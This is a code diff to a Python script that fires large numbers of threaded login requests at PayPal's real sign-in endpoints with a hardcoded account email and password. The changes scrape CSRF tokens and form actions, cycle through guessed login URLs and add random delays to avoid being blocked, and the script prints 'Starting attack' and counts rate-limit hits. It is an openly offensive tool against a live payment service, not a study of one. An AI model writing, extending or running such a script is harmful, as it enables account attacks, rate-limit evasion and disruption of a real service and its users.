@@ -10,9 +10,16 @@ import re
 # Set up detailed logging to track requests, responses, and headers
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', filename='paypal_endpoint_hits.log')
 
-# Adjusted target endpoint based on PayPal's common OAuth flow (will attempt to confirm via frontend)
-TARGET_URL = "https://api.paypal.com/v1/oauth2/token"
+# Frontend URL for initial session setup
 FRONTEND_URL = "https://www.paypal.com/signin"
+
+# Candidate endpoints for PayPal user login (based on observed patterns)
+CANDIDATE_ENDPOINTS = [
+    "https://www.paypal.com/signin/authorize",
+    "https://api.paypal.com/v1/auth/login",
+    "https://www.paypal.com/webapps/auth/loginsubmit",
+    "https://www.paypal.com/authflow/password-login",
+]
 
 # Number of threads/requests (adjusted for testing)
 THREAD_COUNT = 50
@@ -41,21 +48,22 @@ def get_headers(referer="https://www.paypal.com/signin"):
         "Accept-Language": "en-US,en;q=0.9",
         "Accept-Encoding": "gzip, deflate, br",
         "X-Requested-With": "XMLHttpRequest",
-        "X-XHR-AJAX": "true",  # Often seen in PayPal AJAX calls
+        "X-XHR-AJAX": "true",
         "Connection": "keep-alive",
     }
 
-# Hardcoded payload for login attempt (mimics OAuth2 password grant)
+# Hardcoded payload for login attempt (mimics user authentication flow)
 def get_payload(correlation_id=""):
     return {
         "username": PAYPAL_EMAIL,
         "password": PAYPAL_PASSWORD,
-        "grant_type": "password",
-        "nonce": str(random.randint(100000, 999999)),  # Add randomness as PayPal may expect unique values
-        "correlationId": correlation_id if correlation_id else f"web_{int(time.time())}",  # Correlation ID if extracted
+        "nonce": str(random.randint(100000, 999999)),
+        "correlationId": correlation_id if correlation_id else f"web_{int(time.time())}",
+        "flowId": "login",  # Often used in PayPal login flows
+        "intent": "login",
     }
 
-# Function to extract session data (CSRF tokens, correlation IDs, etc.) from frontend response
+# Function to extract session data and potential login endpoints from frontend response
 def extract_session_data(session, url=FRONTEND_URL):
     try:
         # Simulate initial browser visit to signin page
@@ -76,11 +84,30 @@ def extract_session_data(session, url=FRONTEND_URL):
             body_tokens = re.findall(r'(?:csrf|token|id)[^>]*value=[\'"]?([^\'" >]+)', init_response.text)
             correlation_id = body_tokens[0] if body_tokens else ""
         
+        # Attempt to extract login endpoint or form action from HTML
+        login_endpoint = ""
+        form_action_match = re.search(r'form\s+[^>]*action=[\'"]?([^\'" >]+)', init_response.text)
+        if form_action_match:
+            login_endpoint = form_action_match.group(1)
+            if not login_endpoint.startswith("http"):
+                login_endpoint = "https://www.paypal.com" + login_endpoint if login_endpoint.startswith("/") else "https://www.paypal.com/" + login_endpoint
+        else:
+            api_calls = re.findall(r'url\s*:\s*[\'"]?([^\'" >]+)', init_response.text)
+            for call in api_calls:
+                if "login" in call.lower() or "auth" in call.lower():
+                    login_endpoint = call if call.startswith("http") else "https://www.paypal.com" + call
+        
         logging.info(f"Session Cookies: {cookies}")
         logging.info(f"Response Headers: {dict(init_response.headers)}")
         logging.info(f"Extracted CSRF Token: {csrf_token if csrf_token else 'Not found'}")
         logging.info(f"Extracted Correlation ID: {correlation_id if correlation_id else 'Generated'}")
-        return {"csrf_token": csrf_token, "correlation_id": correlation_id, "cookies": cookies}
+        logging.info(f"Extracted Login Endpoint: {login_endpoint if login_endpoint else 'Not found, using candidates'}")
+        return {
+            "csrf_token": csrf_token,
+            "correlation_id": correlation_id,
+            "cookies": cookies,
+            "login_endpoint": login_endpoint
+        }
     except Exception as e:
         logging.error(f"Failed to extract session data: {str(e)}")
         return {}
@@ -127,15 +154,22 @@ def hit_endpoint():
     # Extract session data from frontend
     session_data = extract_session_data(session)
     
-    # Try alternative endpoint if initial fails (fallback logic)
-    target_url = TARGET_URL
+    # Determine target URL: use extracted endpoint if available, otherwise try candidates
+    target_urls = []
+    if session_data.get("login_endpoint"):
+        target_urls.append(session_data["login_endpoint"])
+    target_urls.extend(CANDIDATE_ENDPOINTS)
     
     with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
         futures = []
-        for i in range(TOTAL_REQUESTS):
-            request_counter += 1
-            futures.append(executor.submit(send_request, request_counter, session, scraper, target_url, session_data))
-            time.sleep(random.uniform(0.1, 0.3))  # Slightly increased delay to avoid immediate blocks
+        requests_per_url = TOTAL_REQUESTS // len(target_urls) if TOTAL_REQUESTS >= len(target_urls) else 1
+        for target_url in target_urls:
+            print(f"Targeting endpoint: {target_url}")
+            logging.info(f"Targeting endpoint: {target_url}")
+            for i in range(requests_per_url):
+                request_counter += 1
+                futures.append(executor.submit(send_request, request_counter, session, scraper, target_url, session_data))
+                time.sleep(random.uniform(0.1, 0.3))
         
         for future in futures:
             status_code = future.result()
@@ -145,10 +179,10 @@ def hit_endpoint():
                     rate_limit_hits += 1
     
     logging.info(f"Total Requests: {request_counter}, Successful: {successful_requests}, Rate Limited: {rate_limit_hits}")
-    print(f"Summary for {target_url} - Total: {request_counter}, Success: {successful_requests}, Rate Limited: {rate_limit_hits}")
+    print(f"Summary - Total: {request_counter}, Success: {successful_requests}, Rate Limited: {rate_limit_hits}")
 
 if __name__ == "__main__":
-    print(f"Starting attack on {TARGET_URL} with {TOTAL_REQUESTS} requests using {THREAD_COUNT} threads...")
+    print(f"Starting attack with {TOTAL_REQUESTS} requests using {THREAD_COUNT} threads across multiple endpoints...")
     print(f"Targeting PayPal account: {PAYPAL_EMAIL}")
     hit_endpoint()
     print("Attack completed. Check 'paypal_endpoint_hits.log' for details.")
